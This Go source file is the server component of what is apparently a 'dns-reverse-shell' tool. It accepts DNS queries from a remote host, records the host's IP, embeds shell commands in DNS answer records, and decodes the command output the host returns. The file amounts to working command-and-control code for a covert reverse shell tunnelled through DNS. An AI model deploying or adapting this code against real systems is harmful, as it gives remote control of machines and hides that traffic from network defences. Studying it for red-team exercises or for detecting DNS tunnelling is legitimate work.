package server

import (
	"dns-reverse-shell/main/protocol"
	"dns-reverse-shell/main/protocol/encoder"
	"dns-reverse-shell/main/utils"
	"fmt"
	"github.com/miekg/dns"
)

type dnsHandler struct {
	server *DNSServer
}

func newDnsHandler(s *DNSServer) *dnsHandler {
	return &dnsHandler{server: s}
}

type DNSServer struct {
	port              string
	handler           *dnsHandler
	connectionHandler *connectionHandler
	messageHandler    *protocol.MessageHandler
	commandHandler    protocol.CommandHandler
}

func NewDnsServer(port string) *DNSServer {
	d := &DNSServer{port: port, connectionHandler: newConnectionHandler()}
	d.handler = newDnsHandler(d)
	d.commandHandler = newServerCommandHandler()
	d.messageHandler = protocol.NewMessageHandler(encoder.NewBase64Encoder(), protocol.NewSimpleMessageSplitter())
	return d
}

func (s *DNSServer) Initialize() {
	server := s.createServer()
	s.printConfig()
	go s.commandHandler.(*serverCommandHandler).init()
	err := server.ListenAndServe()
	if err != nil {
		fmt.Printf("Failed to start server: %s\n", err.Error())
	}
}

func (s *DNSServer) createServer() *dns.Server {
	return &dns.Server{
		Addr:      ":" + s.port,
		Net:       "tcp",
		Handler:   s.handler,
		ReusePort: true,
	}
}

func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
	if !h.server.connectionHandler.hasConnection {
		h.server.connectionHandler.setConnectionStatus(true)
		ip := h.server.messageHandler.DecodeAnswerMsg(r)
		fmt.Println("connected to " + ip)
		go h.server.commandHandler.(*serverCommandHandler).initTimeout()
		h.server.commandHandler.(*serverCommandHandler).shell.Resume()
	}
	h.server.handleMessage(w, r)
}

func (s *DNSServer) handleMessage(w dns.ResponseWriter, r *dns.Msg) {
	for _, question := range r.Question {
		s.commandHandler.HandleCommand(question.Name, s.poll(w, r), s.answer(w, r), s.exit)
	}
}

func (s *DNSServer) poll(w dns.ResponseWriter, r *dns.Msg) func() {
	return func() {
		s.sendAnswer(w, r, "idle")
	}
}

func (s *DNSServer) answer(w dns.ResponseWriter, r *dns.Msg) func(command string) {
	return func(command string) {
		if command == "ok" {
			fmt.Println(utils.CurrentTimeAsLogFormat() + "answer received:")
			fmt.Println(s.messageHandler.DecodeAnswerMsg(r))
		}
		s.sendAnswer(w, r, command)
	}
}

func (s *DNSServer) exit() {
	s.connectionHandler.hasConnection = false
}

func (s *DNSServer) sendAnswer(w dns.ResponseWriter, r *dns.Msg, command string) {
	msg := s.messageHandler.CreateAnswerMessage(r)
	msg.Extra = s.messageHandler.BuildDNSExtra(command)
	s.writeMessage(w, msg)
}

func (s *DNSServer) writeMessage(w dns.ResponseWriter, msg *dns.Msg) {
	err := w.WriteMsg(msg)
	if err != nil {
		fmt.Println(err)
		return
	}
}

func (s *DNSServer) printConfig() {
	fmt.Println("----------------------------------------")
	fmt.Println("CONFIGURATION:")
	fmt.Println("Server side timeout is set to " + (timeout * timeoutIterations).String())
	fmt.Println("Starting server on port '" + s.port + "'")
	fmt.Println("----------------------------------------")
}
